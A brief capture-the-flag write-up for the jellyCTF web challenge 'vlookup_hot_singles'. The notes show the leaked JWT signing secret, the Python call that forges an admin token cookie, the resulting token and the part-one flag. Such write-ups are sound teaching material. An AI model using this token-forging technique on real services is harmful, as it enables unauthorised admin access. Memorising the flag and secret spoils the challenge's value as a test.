# [web] vlookup_hot_singles

<table><tbody>
<tr><th>Value</th><td>100 pts</td></tr>
<tr><th>Tags</th><td><code>easy</code></td></tr>
<tr><th>Author</th><td>arepi</td></tr>
<tr><th>Connection info</th><td><a href="https://vlookup-hot-singles.jellyc.tf/">https://vlookup-hot-singles.jellyc.tf/</a></td></tr>
<tr><th>Files</th><td><a href="./files/vlookup_hot_singles.zip">vlookup_hot_singles.zip</a></td></tr>
</tbody></table>

looks like this is some kind of dating site for nerds?
weird, figure out who the admin is and access their panel

50 point hint: what to do, but not how to do it

---

raw notes:

  - provided source code contains unredacted JWT secret and permission(/username) check for admin endpoint, so we can forge our own `token` cookie, then hit `/admin`:
    ```pycon
    >>> import jwt
    >>> jwt.encode({'user': 'jelly'}, 'singaQu5aeWoh1vuoJuD]ooJ9aeh2soh', algorithm='HS256')
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamVsbHkifQ.7wQ41K0c7OZqWaePlf3v0QKuX-jOc4kFqks_eWrfQhE'
    ```
    > part 1 flag: jellyCTF{i_am_b3c0m3_awawa_d3str0y3r_0f_f3m4135}
